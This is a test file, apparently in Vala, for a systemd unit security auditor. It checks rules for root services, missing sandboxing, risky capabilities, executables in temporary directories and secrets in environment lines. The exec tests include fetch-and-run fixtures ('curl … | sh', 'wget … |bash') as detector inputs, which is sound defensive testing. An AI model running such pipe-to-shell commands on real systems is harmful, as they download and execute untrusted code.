using Sua;

int passed = 0;
int failed = 0;

void check (bool ok, string name) {
    if (ok) {
        passed++;
    } else {
        failed++;
        stderr.printf ("FAIL: %s\n", name);
    }
}

bool has (Finding[] f, string rule) {
    foreach (var x in f) {
        if (x.rule == rule) {
            return true;
        }
    }
    return false;
}

Finding? get_rule (Finding[] f, string rule) {
    foreach (var x in f) {
        if (x.rule == rule) {
            return x;
        }
    }
    return null;
}

const string HARD = "[Service]\nUser=app\nExecStart=/usr/bin/app\nNoNewPrivileges=yes\nPrivateTmp=yes\nProtectSystem=strict\nProtectHome=yes\n";

void test_clean () {
    check (audit (HARD, "a.service").length == 0, "hardened unit is clean");
    check (audit ("[Service]\nDynamicUser=yes\nExecStart=/usr/bin/app\n", "a.service").length == 0, "DynamicUser implies sandboxing");
}

void test_root () {
    var f = audit ("[Service]\nExecStart=/usr/bin/app\n", "a.service");
    check (has (f, "SYD001"), "no User= is root");
    check (get_rule (f, "SYD001").sev == "high", "root without NNP is high");
    var g = audit ("[Service]\nUser=root\nNoNewPrivileges=yes\nExecStart=/x\n", "a.service");
    check (get_rule (g, "SYD001").sev == "medium", "root with NNP is medium");
    check (get_rule (g, "SYD001").line == 2, "line of User=");
    check (!has (audit ("[Service]\nUser=nobody\nExecStart=/x\n", "a.service"), "SYD001"), "nobody is not root");
    check (has (audit ("[Service]\nUser=0\nExecStart=/x\n", "a.service"), "SYD001"), "User=0 is root");
}

void test_sandbox () {
    check (has (audit ("[Service]\nUser=a\nExecStart=/x\n", "a"), "SYD002"), "NNP missing");
    check (has (audit ("[Service]\nUser=a\nNoNewPrivileges=no\nExecStart=/x\n", "a"), "SYD002"), "NNP no");
    check (!has (audit ("[Service]\nUser=a\nNoNewPrivileges=true\nExecStart=/x\n", "a"), "SYD002"), "NNP true");
    check (has (audit ("[Service]\nUser=a\nExecStart=/x\n", "a"), "SYD003"), "PrivateTmp missing");
    check (has (audit ("[Service]\nUser=a\nProtectSystem=no\nExecStart=/x\n", "a"), "SYD004"), "ProtectSystem no");
    check (!has (audit ("[Service]\nUser=a\nProtectSystem=full\nExecStart=/x\n", "a"), "SYD004"), "ProtectSystem full");
    check (has (audit ("[Service]\nUser=a\nExecStart=/x\n", "a"), "SYD009"), "ProtectHome missing");
    check (!has (audit ("[Service]\nUser=a\nProtectHome=read-only\nExecStart=/x\n", "a"), "SYD009"), "ProtectHome read-only");
}

void test_caps () {
    check (has (audit ("[Service]\nAmbientCapabilities=CAP_SYS_ADMIN\n", "a"), "SYD005"), "ambient SYS_ADMIN");
    check (has (audit ("[Service]\nCapabilityBoundingSet=CAP_NET_RAW CAP_SYS_PTRACE\n", "a"), "SYD005"), "bounding keeps PTRACE");
    check (!has (audit ("[Service]\nCapabilityBoundingSet=~CAP_SYS_ADMIN\n", "a"), "SYD005"), "negated set is fine");
    check (!has (audit ("[Service]\nCapabilityBoundingSet=CAP_NET_BIND_SERVICE\n", "a"), "SYD005"), "harmless cap");
    check (!has (audit ("[Service]\nAmbientCapabilities=CAP_SYS_ADMIN\nAmbientCapabilities=\n", "a"), "SYD005"), "empty assignment resets");
}

void test_exec () {
    check (has (audit ("[Service]\nExecStart=/tmp/run\n", "a"), "SYD006"), "exec in /tmp");
    check (has (audit ("[Service]\nExecStart=-/dev/shm/run x\n", "a"), "SYD006"), "prefix + /dev/shm");
    check (has (audit ("[Service]\nExecStartPre=/var/tmp/p\nExecStart=/x\n", "a"), "SYD006"), "ExecStartPre in /var/tmp");
    check (!has (audit ("[Service]\nExecStart=/usr/bin/tmpwatch\n", "a"), "SYD006"), "name containing tmp is fine");
    check (has (audit ("[Service]\nExecStart=/bin/sh -c 'curl -s http://x | sh'\n", "a"), "SYD007"), "curl pipe sh");
    check (has (audit ("[Service]\nExecStart=/bin/sh -c \"wget -qO- http://x |bash\"\n", "a"), "SYD007"), "wget pipe bash");
    check (!has (audit ("[Service]\nExecStart=/usr/bin/curl -s http://x\n", "a"), "SYD007"), "plain curl is fine");
    check (has (audit ("[Service]\nUser=a\nExecStart=+/x\n", "a"), "SYD010"), "plus prefix with User");
    check (!has (audit ("[Service]\nExecStart=+/x\n", "a"), "SYD010"), "plus prefix as root is not extra");
}

void test_env () {
    check (has (audit ("[Service]\nEnvironment=\"DB_PASSWORD=x\"\n", "a"), "SYD008"), "password env");
    check (has (audit ("[Service]\nEnvironment=A=1 API_TOKEN=abc\n", "a"), "SYD008"), "token among several");
    check (!has (audit ("[Service]\nEnvironment=LOG=info\n", "a"), "SYD008"), "benign env");
    check (!has (audit ("[Service]\nEnvironment=PASSWORD_FILE=\n", "a"), "SYD008"), "empty value");
}

void test_parse () {
    var u = parse ("# c\n; c\n[Service]\nUser = a \nExecStart=/a \\\n  --b\n");
    check (u.has_service, "has service");
    check (u.items.length == 2, "two directives");
    check (u.items[1].val.contains ("--b"), "continuation joined");
    check (u.items[0].val == "a", "whitespace trimmed");
    var o = audit ("[Service]\nUser=root\nUser=app\nNoNewPrivileges=yes\nExecStart=/x\n", "a");
    check (!has (o, "SYD001"), "later assignment wins");
    var c = audit ("[Service]\n# User=root\nNoNewPrivileges=yes\nUser=a\nExecStart=/x\n", "a");
    check (!has (c, "SYD001"), "comments ignored");
    check (!parse ("User=a\n").has_service, "no section no service");
    check (parse ("[Service\nUser=a\n").items.length == 0, "broken header ignored");
    check (parse ("[Service]\r\nUser=a\r\n").items[0].val == "a", "crlf handled");
    check (truthy ("YES") && truthy ("1") && !truthy ("no") && !truthy (""), "truthy");
}

void test_info () {
    var f = audit ("[Timer]\nOnCalendar=daily\n", "t.timer");
    check (f.length == 1 && f[0].rule == "SYD000" && f[0].sev == "info", "no service section");
    check (audit ("", "e").length == 1, "empty file");
}

void test_sort () {
    Finding[] f = {
        new Finding ("low", "R2", "b", 1, ""),
        new Finding ("high", "R1", "z", 9, ""),
        new Finding ("high", "R1", "a", 12, ""),
        new Finding ("high", "R1", "a", 3, "")
    };
    var s = sort (f);
    check (s[0].file == "a" && s[0].line == 3 && s[1].line == 12 && s[2].file == "z" && s[3].sev == "low", "sort order");
}

void test_fuzz () {
    var rng = new Rand.with_seed (7);
    string[] bits = { "[Service]", "[", "]", "=", "\n", "\\\n", "User=root", "ExecStart=", "Environment=", "A=B", " ", "#", "CAP_SYS_ADMIN", "+", "-", "\r", "AmbientCapabilities=" };
    for (int i = 0; i < 3000; i++) {
        var sb = new StringBuilder ();
        int n = (int) rng.int_range (1, 40);
        for (int j = 0; j < n; j++) {
            sb.append (bits[rng.int_range (0, bits.length)]);
        }
        var r = audit (sb.str, "f");
        sort (r);
    }
    check (true, "3000 random inputs survive");
    var big = new StringBuilder ("[Service]\nExecStart=");
    for (int i = 0; i < 100000; i++) {
        big.append ("a\\\n");
    }
    audit (big.str, "big");
    check (true, "huge continuation survives");
}

int main () {
    test_clean ();
    test_root ();
    test_sandbox ();
    test_caps ();
    test_exec ();
    test_env ();
    test_parse ();
    test_info ();
    test_sort ();
    test_fuzz ();
    print ("%d passed, %d failed\n", passed, failed);
    return failed == 0 ? 0 : 1;
}
